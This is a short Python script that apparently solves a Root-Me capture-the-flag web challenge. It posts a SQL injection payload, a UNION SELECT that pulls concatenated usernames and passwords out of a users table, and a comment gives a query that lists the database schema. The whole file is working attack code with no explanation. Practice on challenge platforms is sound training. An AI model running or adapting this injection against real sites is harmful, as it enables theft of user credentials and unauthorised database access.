import requests

session = requests.session()
url = 'http://challenge01.root-me.org/web-serveur/ch19/?action=recherche'

# retrieve tables: select sql from sqlite_master;--
payload = "'UNION SELECT null,username||password FROM users--"
data = {'recherche':payload}
r = session.post(url, data=data)
print(r.text)